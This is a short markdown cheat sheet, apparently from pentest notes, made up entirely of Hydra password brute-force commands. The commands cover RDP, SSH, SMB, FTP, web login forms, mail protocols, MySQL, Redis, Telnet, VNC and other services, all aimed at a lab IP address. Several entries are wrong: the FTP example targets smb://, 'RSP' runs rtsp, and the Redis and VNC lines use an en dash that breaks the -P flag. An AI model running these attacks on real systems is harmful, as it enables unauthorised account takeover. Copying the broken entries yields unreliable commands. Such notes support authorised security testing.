# Hydra

### GUI

```
xhydra
```

### RDP

```
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
```

### SSH

```
hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
```

### SMB

```
hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V
```

### FTP

```
hydra -l root -P passwords.txt -f smb://10.0.2.5 -V
```

### HTTP Basic Auth

```
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
```

### HTTP POST

```
# HTTP Post
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form
"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login
name or password is incorrect" -V
```

### IMAP

```
# IMAP
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
```

### MySQL

```
# MySQL
hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V
```

### POP

```
# POP
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
```

### Redis

```
# Redis
hydra –P password.txt redis://10.0.2.5 -V
```

### Other Examples

<pre><code>Rexec
hydra -l root -P password.txt rexec://10.0.2.5 -V

Rlogin
hydra -l root -P password.txt rlogin://10.0.2.5 -V

RSH
hydra -L username.txt rsh://10.0.2.5 -V

RSP
hydra -l root -P passwords.txt &#x3C;IP> rtsp

SMTP
hydra -l &#x3C;username> -P /path/to/passwords.txt &#x3C;IP> smtp -V
hydra -l &#x3C;username> -P /path/to/passwords.txt -s 587 &#x3C;IP> -S -v -V
#Port 587 for SMTP with SSL

Telnet
hydra -l root -P passwords.txt [-t 32] &#x3C;IP> telnet
<strong>
</strong><strong>VNC
</strong>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &#x3C;PORT>
&#x3C;IP> vnc
</code></pre>
